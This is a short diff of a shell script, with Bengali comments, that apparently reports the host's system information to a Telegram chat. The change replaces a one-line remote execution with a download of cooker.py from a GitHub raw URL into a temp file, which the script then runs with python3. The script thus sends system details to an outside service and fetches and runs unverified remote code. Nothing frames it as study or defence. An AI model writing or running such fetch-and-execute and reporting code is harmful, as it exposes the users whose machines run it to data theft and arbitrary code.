@@ -67,7 +67,13 @@ system_info=$(get_telegram_system_info)
 send_telegram_msg "$system_info"
 
 # Python স্ক্রিপ্ট রান করার ফাংশন
-run_cooker() {
-    python3 <(curl -s https://raw.githubusercontent.com/Cybergho5tX/chicken/refs/heads/main/cookeer.py) "$@"
-}
 
+TEMP_SCRIPT=$(mktemp)
+curl -s https://raw.githubusercontent.com/Cybergho5tX/chicken/refs/heads/main/cooker.py -o "$TEMP_SCRIPT"
+if [ $? -eq 0 ]; then
+    python3 "$TEMP_SCRIPT" "$@"
+    rm "$TEMP_SCRIPT"
+else
+    echo "Error: Failed to download the script"
+    exit 1
+fi
